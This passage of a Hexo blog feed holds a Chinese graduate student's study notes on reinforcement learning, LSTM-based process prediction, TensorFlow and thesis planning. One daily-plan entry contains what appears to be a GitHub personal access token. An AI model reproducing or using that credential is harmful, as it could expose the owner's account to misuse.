      <title>2021-11-8【mission】</title>
      <link href="/2021/11/08/2021-11-8%E3%80%90mission%E3%80%91/"/>
      <url>/2021/11/08/2021-11-8%E3%80%90mission%E3%80%91/</url>
      
        <content type="html"><![CDATA[<h1 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h1><ol><li>20.50-11.20 <a href="https://rl.qiwihui.com/zh_CN/latest/partII/chapter9/on-policy_prediction_with_approximation.html">在策略预测近似方法</a></li><li>在策略控制近似方法</li><li>离策略近似方法</li><li>资格迹</li><li>策略梯度的方法</li><li>周报</li></ol><h1 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h1><p> 如果强化学习系统要适用于人工智能或大型工程应用，则必须能够进行 泛化。 为了实现这一点，可以简单地通过将每个更新视为训练样例，使用用于 监督学习函数近似 的任何广泛的现有方法。</p><p>也许最合适的监督学习方法是使用 参数化函数近似 的方法，其中策略由权向量 w 参数化。 虽然权重向量有很多分量，但状态空间仍然大得多，我们必须找到一个近似的解决方案。 我们将 均方值误差 VE¯¯¯¯¯¯¯¯(w) 定义为 在策略分布 μ 下 权重向量 w 的值 vπw(s) 中的误差的度量。 VE¯¯¯¯¯¯¯¯ 为我们提供了一种明确的方法，可以在在<a href="https://rl.qiwihui.com/zh_CN/latest/partII/chapter9/on-policy_prediction_with_approximation.html#id16">策略案例</a>中对不同的价值函数近似进行排序。<br>为了找到一个好的权重向量，最流行的方法是 随机梯度下降 （SGD）的变化。 在本章中，我们重点关注具有 固定策略 的 在策略 案例，也称为策略评估或预测； 这种情况下的自然学习算法是 n步半梯度TD，其包括梯度蒙特卡罗和半梯度TD(0)算法 作为 n=∞ 和 n=1 的特殊情况。半梯度TD方法不是真正的梯度方法。 在这种自举方法（包括DP）中，权重向量出现在更新目标中，但在计算梯度时不考虑这一点──因此它们是 半 梯度方法。 因此，他们不能依赖于经典的SGD结果。</p><p>然而，在 线性 函数近似的特殊情况下，半梯度方法可以获得良好的结果， 其中价值估计是特征的总和乘以相应的权重。线性情况在理论上是最容易理解的，并且在提供适当特征时在实践中工作良好。 选择特征是将先前领域知识添加到强化学习系统的最重要方法之一。 它们可以被选择为多项式，但是这种情况在通常在强化学习中考虑的在线学习设置中很难感化。 更好的是根据傅立叶基选择特征，或者根据稀疏重叠感受域的某种形式的粗编码。 铺片编码是粗编码的一种形式，其特别具有计算效率和灵活性。 径向基函数对于一维或二维任务非常有用，其中平滑变化的响应很重要。 LSTD是数据最有效的线性TD预测方法，但<font color="#8A2BE2">需要与权重数的平方成比例的计算</font>，而所有其他方法在权重数量上<font color="#A52A2A">具有线性复杂性</font>。 非线性方法包括通过反向传播训练的人工神经网络和SGD的变化；这些方法近年来以 深度强化学习 的名义变得非常流行。</p><p>对于所有 n，线性半梯度n步TD保证在标准条件下 收敛到最佳误差范围内的 VE¯¯¯¯¯¯¯¯ （通过蒙特卡罗方法渐近实现）。 对于更高的n，这个界限总是更紧，并且对于 n→∞ 来说接近零。 然而，在实践中，非常高的n导致学习非常缓慢，并且一定程度的自举（n&lt;∞）通常是可取的， 正如我们在第7章中的表格n步法和和第5章中表格TD和蒙特卡罗方法的比较中所看到的那样。</p><p><a href="https://www.sohu.com/a/136502405_114877">采样</a> </p><p><img src="http://files.shanqianche.cn/20211113/1636808280633.png" alt="最后用伪代码进行阐述"></p><p>需要修改的是动作策略</p>]]></content>
      
      
      <categories>
          
          <category> plan </category>
          
      </categories>
      
      
        <tags>
            
            <tag> daily </tag>
            
            <tag> graduate student </tag>
            
            <tag> study </tag>
            
            <tag> plan </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021-11-01【周总结】</title>
      <link href="/2021/11/01/2021-11-01%E3%80%90%E5%91%A8%E6%80%BB%E7%BB%93%E3%80%91/"/>
      <url>/2021/11/01/2021-11-01%E3%80%90%E5%91%A8%E6%80%BB%E7%BB%93%E3%80%91/</url>
      
        <content type="html"><![CDATA[<p>目标<br>1.流程构建辅助决策<br>2.页面元素获取<br>3.运行过程中的自动修正和反馈</p><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><h2 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h2><p>[1]周能. 复杂场景下基于深度增强学习的移动机器人控制方法研究[D].北京邮电大学,2019.<br><a href="https://segmentfault.com/a/1190000014128757">强化学习</a><br><a href="https://blog.csdn.net/weixin_41521681/article/details/108016951">强化学习算法分类</a><br>[1]凌兴宏,李杰,朱斐,刘全,伏玉琛.基于双重注意力机制的异步优势行动者评论家算法[J].计算机学报,2020,43(01):93-106.</p><h2 id="策略模块"><a href="#策略模块" class="headerlink" title="策略模块"></a>策略模块</h2><ol><li>无算法</li><li>组成：影响因子【暂定名称】，决策池、根据因子和决策池重新构建权重最大的可能【简单算法】</li><li>是否考虑不同错误对应不同修改方案</li><li>影响因子不仅是根据页面元素的可能性设置，同时需要考虑动作</li><li>错误的基本原因“自适应”，“版本更替”</li><li>增强模型，决策函数，评估函数，奖励函数和外界反馈</li></ol><p><img src="http://files.shanqianche.cn/2021102/1633159142456.png" alt="DQN"></p><p><img src="http://files.shanqianche.cn/2021102/1633159979319.png" alt="训练框架"></p><h3 id="idea"><a href="#idea" class="headerlink" title="idea"></a>idea</h3><ol><li>预测模块基于lstm进行微调</li><li>改进增强学习模型actor-critic，加入影响因子，提高决策效果</li><li>为了控制<h2 id="引用-1"><a href="#引用-1" class="headerlink" title="引用"></a>引用</h2>智能自动化技术在汽车安全辅助驾驶系统中的应用 </li></ol><h1 id="二辩准备"><a href="#二辩准备" class="headerlink" title="二辩准备"></a>二辩准备</h1><h2 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h2><ul><li><input disabled="" type="checkbox"> <ol><li>ppt新增页面—上次答辩记录和修改</li></ol></li><li><input disabled="" type="checkbox"> <ol start="2"><li>将DOM元素获取放到最后一个研究方案</li></ol></li><li><input disabled="" type="checkbox"> <ol start="3"><li>重新写研究目标，研究内容，研究方案，算法是主要</li></ol></li></ul><h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><ol><li>情节性的任务需要重新额外的<a href="https://rl.qiwihui.com/zh_CN/latest/partI/chapter3/finite_markov_decision_process.html#id2">符号</a></li><li>算法函数<a href="https://rl.qiwihui.com/zh_CN/latest/partI/chapter3/finite_markov_decision_process.html#id13">分析</a></li><li>多个动作集合成一个，减少不必要的搜索</li><li>一个栗子 示例3.19：回收机器人的贝尔曼最优方程 使用（<a href="https://rl.qiwihui.com/zh_CN/latest/partI/chapter3/finite_markov_decision_process.html#id13">3.19</a>）这个解决方案依赖于至少三个假设，在实践中很少是这样的： （1）我们准确地知道环境的动态；（2）我们有足够的计算资源来完成解决方案的计算；（3）马尔可夫性。 </li><li> <a href="https://rl.qiwihui.com/zh_CN/latest/partI/chapter4/dynamic_programming.html#id7">使价值函数的策略贪婪通常会使更改的策略的价值函数不正确，使价值函数与策略一致通常会导致该策略不再贪婪。</a>  策略评估 指的是（通常）迭代计算一个给定策略的价值函数。策略提升 指的是给定一个策略的价值函数计算一个提升的策略。</li><li>  就像在动态规划（DP）的那章所做的，首先我们考虑预测的问题 （计算一个确定的随机策略 π 的价值 vπ 和 qπ ）， 然后是策略提升，以及最后，控制的问题和解决它的广义策略迭代方法。 从动态规划（DP）中得到的这些想法都被推广到蒙特卡洛方法中，不过在这种情况下（指蒙特卡洛），我们只有样本经验。</li><li>  行为策略&amp;目标策略的制定</li><li>  rollout策略生成模拟轨迹</li><li>  MCTS决策时规划取得的巨大成功深刻影响了人工智能，许多研究人员正在研究用于游戏和单一个体应用程序的<a href="https://rl.qiwihui.com/zh_CN/latest/partI/chapter8/planning_and_learning_with_tabular_methods.html#id12">基本程序的修改和扩展</a>。</li><li>  <a href="https://rl.qiwihui.com/zh_CN/latest/partI/chapter8/planning_and_learning_with_tabular_methods.html#id14">总结</a></li><li>  <a href="https://rl.qiwihui.com/zh_CN/latest/partII/index.html#id1">泛化</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> plan </category>
          
      </categories>
      
      
        <tags>
            
            <tag> graduate student </tag>
            
            <tag> study </tag>
            
            <tag> weekly </tag>
            
            <tag> plan </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>开题准备</title>
      <link href="/2021/09/30/%E5%BC%80%E9%A2%98%E5%87%86%E5%A4%87/"/>
      <url>/2021/09/30/%E5%BC%80%E9%A2%98%E5%87%86%E5%A4%87/</url>
      
        <content type="html"><![CDATA[<p>目标<br>1.流程构建辅助决策<br>2.页面元素获取<br>3.运行过程中的自动修正和反馈</p><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><h2 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h2><p>[1]周能. 复杂场景下基于深度增强学习的移动机器人控制方法研究[D].北京邮电大学,2019.<br><a href="https://segmentfault.com/a/1190000014128757">强化学习</a><br><a href="https://blog.csdn.net/weixin_41521681/article/details/108016951">强化学习算法分类</a><br>[1]凌兴宏,李杰,朱斐,刘全,伏玉琛.基于双重注意力机制的异步优势行动者评论家算法[J].计算机学报,2020,43(01):93-106.</p><h2 id="策略模块"><a href="#策略模块" class="headerlink" title="策略模块"></a>策略模块</h2><ol><li>无算法</li><li>组成：影响因子【暂定名称】，决策池、根据因子和决策池重新构建权重最大的可能【简单算法】</li><li>是否考虑不同错误对应不同修改方案</li><li>影响因子不仅是根据页面元素的可能性设置，同时需要考虑动作</li><li>错误的基本原因“自适应”，“版本更替”</li><li>增强模型，决策函数，评估函数，奖励函数和外界反馈</li></ol><p><img src="http://files.shanqianche.cn/2021102/1633159142456.png" alt="DQN"></p><p><img src="http://files.shanqianche.cn/2021102/1633159979319.png" alt="训练框架"></p><h3 id="idea"><a href="#idea" class="headerlink" title="idea"></a>idea</h3><ol><li>预测模块基于lstm进行微调</li><li>改进增强学习模型actor-critic，加入影响因子，提高决策效果</li><li>为了控制<h2 id="引用-1"><a href="#引用-1" class="headerlink" title="引用"></a>引用</h2>智能自动化技术在汽车安全辅助驾驶系统中的应用 </li></ol><h1 id="二辩准备"><a href="#二辩准备" class="headerlink" title="二辩准备"></a>二辩准备</h1><h2 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h2><ul><li><input disabled="" type="checkbox"> <ol><li>ppt新增页面—上次答辩记录和修改</li></ol></li><li><input disabled="" type="checkbox"> <ol start="2"><li>将DOM元素获取放到最后一个研究方案</li></ol></li><li><input disabled="" type="checkbox"> <ol start="3"><li>重新写研究目标，研究内容，研究方案，算法是主要</li></ol></li></ul><h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><ol><li>情节性的任务需要重新额外的<a href="https://rl.qiwihui.com/zh_CN/latest/partI/chapter3/finite_markov_decision_process.html#id2">符号</a></li><li>函数<a href="https://rl.qiwihui.com/zh_CN/latest/partI/chapter3/finite_markov_decision_process.html#id13">分析</a></li><li>多个动作集合成一个，减少不必要的搜索</li><li>一个栗子 示例3.19：回收机器人的贝尔曼最优方程 使用（<a href="https://rl.qiwihui.com/zh_CN/latest/partI/chapter3/finite_markov_decision_process.html#id13">3.19</a>）这个解决方案依赖于至少三个假设，在实践中很少是这样的： （1）我们准确地知道环境的动态；（2）我们有足够的计算资源来完成解决方案的计算；（3）马尔可夫性。 </li><li> <a href="https://rl.qiwihui.com/zh_CN/latest/partI/chapter4/dynamic_programming.html#id7">使价值函数的策略贪婪通常会使更改的策略的价值函数不正确，使价值函数与策略一致通常会导致该策略不再贪婪。</a>  策略评估 指的是（通常）迭代计算一个给定策略的价值函数。策略提升 指的是给定一个策略的价值函数计算一个提升的策略。</li><li>  就像在动态规划（DP）的那章所做的，首先我们考虑预测的问题 （计算一个确定的随机策略 π 的价值 vπ 和 qπ ）， 然后是策略提升，以及最后，控制的问题和解决它的广义策略迭代方法。 从动态规划（DP）中得到的这些想法都被推广到蒙特卡洛方法中，不过在这种情况下（指蒙特卡洛），我们只有样本经验。</li><li>  行为策略&amp;目标策略的制定</li></ol>]]></content>
      
      
      <categories>
          
          <category> plan </category>
          
      </categories>
      
      
        <tags>
            
            <tag> graduate student </tag>
            
            <tag> study </tag>
            
            <tag> plan </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021-9-06【周总结】</title>
      <link href="/2021/09/06/2021-9-06%E3%80%90%E5%91%A8%E6%80%BB%E7%BB%93%E3%80%91/"/>
      <url>/2021/09/06/2021-9-06%E3%80%90%E5%91%A8%E6%80%BB%E7%BB%93%E3%80%91/</url>
      
        <content type="html"><![CDATA[<h1 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h1><ol><li><input checked="" disabled="" type="checkbox"> tensorflow2.0</li><li><input checked="" disabled="" type="checkbox"> 看LSTM源码，了解其对于数据的处理方式</li><li><input checked="" disabled="" type="checkbox"> 继续看源码</li></ol><ul><li><input checked="" disabled="" type="checkbox"> <ol start="7"><li>几篇论文创意点总结</li></ol></li><li><input disabled="" type="checkbox"> <ol start="10"><li>几篇论文创意点总结</li></ol></li><li><input checked="" disabled="" type="checkbox"> <ol start="11"><li>小论文摘要</li></ol></li><li><input checked="" disabled="" type="checkbox"> <ol start="7"><li>几篇论文创意点总结<h1 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h1></li></ol></li></ul><ul><li>学的是tensorflow中自动求导机制的函数GradientTape()，其中包函了一阶求导和二阶求导。</li><li>对于一个Tensor和Variable类型，如果你的网络结构使用的是Dense Layers构建的，里面的变量w, b类型就是Variable类型的变量， <font color="#0000FF">也就是不需要watch</font>；如果我们构建的x是一个constant也就是一个Tenosr类型的话，为了更好的跟踪梯度的相关信息，这里需要把它加进tape.watch里面去，这个例子就是。</li><li><font color="#228B22">tf.GradientTape里面默认只会跟踪tf.Variable()类型</font>。如果类型不是这个的话。这里为tf.tensor,tf.Variable是tf.tensor的一种特殊类型。因此简单的包装一下，在tensor类型外面包一个Variable类型。</li></ul><p> “Classifying process instances using recurrent neural networks,”–Springer, 2018, pp. 313–324.</p><ul><li>paper中作者的创意是首次使用LSTM和GRU流程进行分类并进行对比，GRU效果较好。【涉及到超长序列可能有用。作者思想是<font color="#A52A2A">将长序列中不频繁及数量少的序列视为一项活动</font>，可以进一步提高吞吐量时间且不会显著影响分类精度】</li></ul><p>“Learning Effective Neural Nets for Outcome Prediction from Partially Labelled Log Data”–2019 IEEE</p><ul><li><p>paper中作者的创新点是基于默认模型进行无监督学习，主要思路是通过微调来提高预测精准度。比较的是训练数据集大小与预测准确度之间的比例，<font color="#7FFF00">没有可以借鉴的</font>。</p><h1 id="TODO-1"><a href="#TODO-1" class="headerlink" title="TODO"></a>TODO</h1><p>构思开题，与自己研究方向出入较大。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> plan </category>
          
      </categories>
      
      
        <tags>
            
            <tag> graduate student </tag>
            
            <tag> study </tag>
            
            <tag> weekly </tag>
            
            <tag> plan </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>EVERYDAY---2021</title>
      <link href="/2021/08/30/EVERYDAY---2021/"/>
      <url>/2021/08/30/EVERYDAY---2021/</url>
      
        <content type="html"><![CDATA[<h1 id="TODO-List"><a href="#TODO-List" class="headerlink" title="TODO List"></a>TODO List</h1><ul><li><input disabled="" type="checkbox"> 9:00~10:00 今日学习学习            <strong><font color="#D2691E">todo-1</font></strong></li><li><input disabled="" type="checkbox"> 10:00~10:20 上午学习总结</li><li><input disabled="" type="checkbox"> 10:20~10:50 breaking news【一三五】</li><li><input disabled="" type="checkbox"> 10:20~10:50 coding【二四六】</li><li><input disabled="" type="checkbox"> 10:50~11:20 coding【一三五】</li><li><input disabled="" type="checkbox"> 10:50~11:20 刘畅【二四六】</li></ul><hr><ul><li><input disabled="" type="checkbox"> 14:00~15:00 今日学习安排            <strong><font color="#ff7500">todo-2</font></strong></li><li><input disabled="" type="checkbox"> 15:00~16:00 今日学习安排            <strong><font color="#01274F">todo-3</font></strong></li><li><input disabled="" type="checkbox"> 16:00~16:40 今日学习安排            <strong><font color="#2e4e7e">todo-4</font></strong></li><li><input disabled="" type="checkbox"> 16:40~17:10 下午学习总结</li></ul><hr><ul><li><input disabled="" type="checkbox"> 18:30~20:00 无字幕版美剧</li><li><input disabled="" type="checkbox"> 20:00~21:30 晚上学习安排            <strong><font color="#8B008B">todo-5</font></strong></li><li><input disabled="" type="checkbox"> 21:30~22:10 晚上学习安排            <strong><font color="#7FFF00">todo-6</font></strong></li><li><input disabled="" type="checkbox"> 22:10~22:30 晚上学习总结</li></ul><p>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 </p>]]></content>
      
      
      <categories>
          
          <category> plan </category>
          
      </categories>
      
      
        <tags>
            
            <tag> daily </tag>
            
            <tag> graduate student </tag>
            
            <tag> study </tag>
            
            <tag> plan </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021-8-24【周总结】</title>
      <link href="/2021/08/24/2021-8-24%E3%80%90%E5%91%A8%E6%80%BB%E7%BB%93%E3%80%91/"/>
      <url>/2021/08/24/2021-8-24%E3%80%90%E5%91%A8%E6%80%BB%E7%BB%93%E3%80%91/</url>
      
        <content type="html"><![CDATA[<h1 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h1><ul><li><input checked="" disabled="" type="checkbox"> 学习吴恩达–机器学习视频</li><li><input checked="" disabled="" type="checkbox"> 搭建本地实验环境</li><li><input checked="" disabled="" type="checkbox"> 查看数据集，查看基本预处理方法</li><li><input disabled="" type="checkbox"> 小论文框架构建</li></ul><h1 id="Done"><a href="#Done" class="headerlink" title="Done"></a>Done</h1><ol><li>前段时间只是看完前半部分中吴老师讲的机器学习中基础算法理论，看完这些的时候基本上论文中涉及到机器学习专业词汇都能理解，就算有些涉及到了模型也可以通过查询很快就能理解。上周做实验的时候经常做不下去，就索性把吴老师后半部分的课程看完了，大概有40节，主要包函的是常见的模型，支持向量机，核函数，以及k-means，还有一部分是对于数据的预处理的方法。【看这个视频的原因一个是需要入门，另一个主要原因是当时听彭老师实验室一个研一学生的分享，他做了一次基本实验的演示分享，觉得很不错，对于模型的理解更加透彻，最后才听到他和彭老师对话说的，就是跟着视频学习，所以觉得自己也应该学一遍】</li><li>主要是为了学习tensorflow，本地搭建了python3.6+tensorflow1.5.0和python3.7+tensorflow2.1.1两个版本，由于tensorflow2是去年年初更新的，而且两个版本差异比较大，所以都进行了对于其CPU版本进行简单的尝试</li><li>适用Prom工具进行了简单流程挖掘，基本的流程可以挖掘出来了，下一步是对数据进行预处理，这一块估计有很大工作量</li><li>小论文框架已经开始构思了，现在在整理之前看到的paper，近两年文章发的比较少哇，所以看的论文一般都是2019年以前的。</li></ol><p><strong><font color="#1E90FF">目前的论文思维导图：</font></strong></p><p><img src="http://files.shanqianche.cn/2021825/1629874905860.png" alt="Introduce的材料"></p><p><img src="http://files.shanqianche.cn/2021825/1629874977085.png" alt="部分数据集及预处理"></p><p><img src="http://files.shanqianche.cn/2021825/1629875159925.png" alt="预处理"></p><p><font color="#5F9EA0">近几年都是前缀填充和连续编码为主，目前我只看到18年有一篇用到N-gram，还是适用自动编码器的文中用到了，其它LSTM这种热门框架都没用到，这个后续中我也会把序列编码的方法换成连续编码。</font></p><p><img src="http://files.shanqianche.cn/2021825/1629875199842.png" alt="后续待完善"></p><p>这几年都没看到有与语义结合的，就LSTM，GRU这种RNN网络结构，<font color="#CC391D">个人感觉</font>上下文关系在其中的体现不是很大，因为本身业务流程直接关系没有那么复杂，words bag也没有自然语言中实体处理中的那么大，下周抽空看一篇，记得之前看到过一篇。</p><h1 id="下周安排"><a href="#下周安排" class="headerlink" title="下周安排"></a>下周安排</h1><ul><li><input disabled="" type="checkbox"> 看一遍吴老师对于深度学习的讲解</li><li><input disabled="" type="checkbox"> “TAP: A Transformer based Activity Prediction Exploiting Temporal Relations in Collaborative Tasks” 2021 IEEE</li><li><input disabled="" type="checkbox"> 书写小论文的introduce</li><li><input disabled="" type="checkbox"> 继续学习tensorflow的使用</li></ul>]]></content>
      
      
      <categories>
          
          <category> plan </category>
          
      </categories>
      
      
        <tags>
            
            <tag> graduate student </tag>
            
            <tag> study </tag>
            
            <tag> weekly </tag>
            
            <tag> plan </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021-8-15【周总结】</title>
      <link href="/2021/08/15/2021-8-17%E3%80%90%E5%91%A8%E6%80%BB%E7%BB%93%E3%80%91/"/>
      <url>/2021/08/15/2021-8-17%E3%80%90%E5%91%A8%E6%80%BB%E7%BB%93%E3%80%91/</url>
      
        <content type="html"><![CDATA[<h1 id="本周安排"><a href="#本周安排" class="headerlink" title="本周安排"></a>本周安排</h1><ul><li><input checked="" disabled="" type="checkbox"> 思考小论文的可研究点</li><li><input disabled="" type="checkbox"> 构建论文结构~</li><li><input disabled="" type="checkbox"> 查找相关算法</li><li><input checked="" disabled="" type="checkbox"> 搭建实验室论坛</li></ul><h1 id="完成情况"><a href="#完成情况" class="headerlink" title="完成情况"></a>完成情况</h1><h2 id="研究点"><a href="#研究点" class="headerlink" title="研究点"></a>研究点</h2><ol><li><p>在不损失正常长度流程的预测精度下，提高长度较长的预测精度</p><ul><li>方法一：该想法建立的基础是在RNN神经网络上，由于对于长序列的处理效率低，所以当时想的可以通过预处理，<strong>通过聚类或者其它方式划分长序列相似片段，再进行局部匹配</strong></li><li>方法二：同样基于RNN，预处理，为长度设置不同给的阈值，然后分别进行预测，但是这样会导致长度长的数据集效率低下，依旧是根本性。</li></ul></li><li><p>加入时间戳或者其它属性来提高预测精度</p><ul><li>主要正对的是attention，本身attention机制对于长序列有较好的预测效果，考虑通过加入时间戳或其它属性来提高预测精度，这块由于比较新，目前我看的论文中没有提到加入其它属性。</li><li>虽然attention在长序列的预测中效率较高，但是由于其机制的根本原因，他不对顺序进行记录，最近看的论文中提到的位置记录模块是通过将位置编码加入到嵌入向量中，考虑是否有其它方法来处理解决顺序预测。</li></ul></li></ol><p><strong>老师，如果对这块有其它好的建议，请给我说哈</strong></p><h2 id="构建论文使用技术框架"><a href="#构建论文使用技术框架" class="headerlink" title="构建论文使用技术框架"></a>构建论文使用技术框架</h2><ol><li>Input data</li></ol><p>这里涉及的主要是日志处理，去除无用信息，根据需求对日志进行分组。<i class="fas fa-tags"></i>这一步很重要，公用数据集给的数据集包函的属性较多也包含一些错误的事件日志，需要在预处理时去除掉，这样才能获得准确的比对权重。<br>2. Predictions type</p><p> 现在还是主要<strong>预测下一个活动</strong>，但是很多论文中会加入其它预测任务，其他预测任务作为辅助任务，可能有助于提高预测性能。<br>唯一的例外是剩余的时间预测问题，因为它可以作为一个直接的预测。</p><ol start="3"><li>Neural Network Type</li></ol><p>LSTM ，Bidirectional LSTM ，包括最近的Transformers都会考虑，尤其LSTM会作为baseline作为对比对象。</p><ol start="4"><li>Sequence encoding</li></ol><p>神经网络都是以固定大小的张量编码方式输入，但是流程序列明显长短不一，所以需要对于输入数据进行规范化。</p><pre><code> 最常用的编码是连续编码和前缀填充编码，因为它们非常通用，可以同时用于cnn和rnn。连续编码和前缀填充编码都是通过填0的方式，使不同长度的序列达到相同的长度。其中又比较了N-gram编码，类似于hash算法将不同长度的序列转化为相同长度的hash值，但是目前只用于自动编码器中，LSTM和Transformer还没有用过，不知道适不适合。TODO：检查N-gram的适用性。</code></pre><ol start="5"><li>Event encoding</li></ol><p>这里主要比较了one-hot和嵌入编码，考虑到日中中流程种类，事件种类较多，而且很多paper验证了嵌入编码是目前预测任务中表现最优的事件编码方式，所以选择了嵌入编码。<br>  6. 数据集</p><p>TODO<br>  7. 验证指标</p><p>TODO<br>  8. 实验</p><p>TODO</p><h2 id="相关算法"><a href="#相关算法" class="headerlink" title="相关算法"></a>相关算法</h2><p>刚开始准备查序列比对的算法，但是目前深度学习中几乎不会用到这种算法，一般只有机器学习中才会用到，当时看的是一个KMP算法；后面考虑到是预处理时，对于长序列进行分段，或者将长序列相似部分进行标记，不会学习预测重复序列，那么这里涉及的是序列查找相似片段相关的算法。所以下一步准备找这些算法。</p><p>如果老师有了解或者看见过相关的算法，请给我推荐一下，我现在也是盲看，这块在预测中没人提出来，所以没有相关算法的介绍，我不知道他们没有提出这种思路是因为这种思路对于精确度的提升没有效果还是有其它原因，但是我看到有的paper中确实对长序列精确度进行了比较，所以感觉可以研究。</p><h2 id="搭建实验室论坛"><a href="#搭建实验室论坛" class="headerlink" title="搭建实验室论坛"></a>搭建实验室论坛</h2><p>局域网内依旧搭建完成了，只需要在公司后台进行nginx配发就可以在公共网络访问了，周一进行尝试后发现失败，然后他们运维在忙，就没弄域名了。</p><h1 id="下周安排"><a href="#下周安排" class="headerlink" title="下周安排"></a>下周安排</h1><ol><li>对于长序列预测的论文进行总结，比较他人的处理方式和优缺点</li><li>对数据集进行初步挖掘，查看长的日志是否与自己理解相似，即长的原因为重复事件较多</li><li>继续查看相关算法</li><li>了解N-gram是否适合于RNN模式</li></ol>]]></content>
      
      
      <categories>
          
          <category> plan </category>
          
      </categories>
      
      
        <tags>
            
            <tag> graduate student </tag>
            
            <tag> study </tag>
            
            <tag> weekly </tag>
            
            <tag> plan </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2021-8-1【周总结】</title>
      <link href="/2021/08/03/2021-8-1%E3%80%90%E5%91%A8%E6%80%BB%E7%BB%93%E3%80%91/"/>
      <url>/2021/08/03/2021-8-1%E3%80%90%E5%91%A8%E6%80%BB%E7%BB%93%E3%80%91/</url>
      
        <content type="html"><![CDATA[<h1 id="本周安排"><a href="#本周安排" class="headerlink" title="本周安排"></a>本周安排</h1><ul><li><input checked="" disabled="" type="checkbox"> 分析理解LSTM框架</li><li><input checked="" disabled="" type="checkbox"> 阅读的相关论文</li><li><input disabled="" type="checkbox"> 构建环境，复现一个论文中的代码</li><li><input disabled="" type="checkbox"> 了解项目中神经网络的应用</li></ul><h1 id="完成情况"><a href="#完成情况" class="headerlink" title="完成情况"></a>完成情况</h1><h2 id="对于LSTM的框架进行了简单的理解"><a href="#对于LSTM的框架进行了简单的理解" class="headerlink" title="对于LSTM的框架进行了简单的理解"></a>对于LSTM的框架进行了简单的理解</h2><p><img src="./attachments/Long_Short_Term_Memory_Networks.pdf" alt="Long Short Term Memory Networks"></p><h2 id="精度《基于LSTM神经网络的业务过程预测》"><a href="#精度《基于LSTM神经网络的业务过程预测》" class="headerlink" title="精度《基于LSTM神经网络的业务过程预测》"></a>精度《基于LSTM神经网络的业务过程预测》</h2><p> 这一篇主要是对于事件和时间戳的预测 <img src="./attachments/%E5%9F%BA%E4%BA%8ELSTM%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%9A%84%E4%B8%9A%E5%8A%A1%E8%BF%87%E7%A8%8B%E9%A2%84%E6%B5%8B%E7%9B%91%E6%8E%A7.pdf" alt="基于LSTM神经网络的业务过程预测监控"> 基本上理解了作者意图和操作，但是我没法理解LSTM层如何学习数据</p><h2 id="略读了几篇论文，试图理解LSTM的运行逻辑"><a href="#略读了几篇论文，试图理解LSTM的运行逻辑" class="headerlink" title="略读了几篇论文，试图理解LSTM的运行逻辑"></a>略读了几篇论文，试图理解LSTM的运行逻辑</h2><ol><li>使用LSTM对于事件类型较少的序列进行迭代循环预测，使用的是one-hot编码将事件类型，事件戳映射到向量特征向量，并使用事件发生的时间特征对其进行补充。<strong>缺点</strong>是当事件类型较多的时候，该方法效果会变差。</li></ol><ul><li>该模型由共享LSTM层构成，其中包括一个专门用于预测事件的LSTM和一个预测事件的LSTM</li></ul><p><img src="http://files.shanqianche.cn/2021730/1627633758272.png" alt="2017-使用LSTM神经网络进行预测性业务流程监控"></p><ol start="2"><li>使用嵌入维度的LSTMs，可以减少输入长度和增加新的特征。<strong>缺点</strong>是依旧无法处理数值变量，所以也不能预测时间戳。<strong>优点</strong>是可以处理大量事件类型。</li></ol><ul><li>使用两层LSTMs隐藏层。</li></ul><p><img src="http://files.shanqianche.cn/2021730/1627636620079.png" alt="2017-利用深度学习预测过程行为"></p><ol start="3"><li>使用多阶段深度学习的方法来预测下一个事件。<strong>缺点</strong>是无法处理数值变量，所以也不能预测时间戳。</li></ol><ul><li>首先是将每个事件映射到特征向量</li><li>下一步使用transformations降低输入维度，通常有，通过提取n-gram、使用hash、将输入通过两个自动编码层等方法</li><li>将转化后的输入传给负责预测的前馈神经网络</li></ul><p><img src="http://files.shanqianche.cn/202182/1627887742568.png" alt="业务流程事件预测的多阶段深度学习方法"></p><p><strong>总结</strong><br>在阅读了几篇类似的paper后，对于LSTM在其中的作用理解加深，但是每一篇文章的重点或者内容侧重点更多是在数据处理上，而LSTM只是作为个较为优秀的神经网络结构。通过略看论文，感觉这可能就是发论文的方式哇。最后我在理解了LSTM网络层的基本原理后不在纠结于它在实际中的运行原理，也把它理解成一个模块了。</p><h2 id="复现精度论文的代码"><a href="#复现精度论文的代码" class="headerlink" title="复现精度论文的代码"></a>复现精度论文的代码</h2><p>失败了，可能是第一次复现深度学习的项目的原因吧，没有经验，每一步都有错误，整整三天晚上都在调试，错误是解决了不少，但是还是效率太低了，所以决定找个简单的入门，先使用一下LSTM再说。</p><p><strong>一个简单的情感分析</strong></p><p><img src="http://files.shanqianche.cn/202183/1627997675435.png" alt="数据"><br>只是简单的使用LSTM所以用最简单矩阵数据</p><p><img src="http://files.shanqianche.cn/202183/1627997947288.png" alt="结果"><br>每个epoch为10，进行语义训练，这次训练数据极度拟合，所以结果没有参考价值，主要是熟悉LSTM的使用。</p><h1 id="下周安排"><a href="#下周安排" class="headerlink" title="下周安排"></a>下周安排</h1><ul><li><input disabled="" type="checkbox"> 再挑一篇新的顶刊论文进行精读</li><li><input disabled="" type="checkbox"> 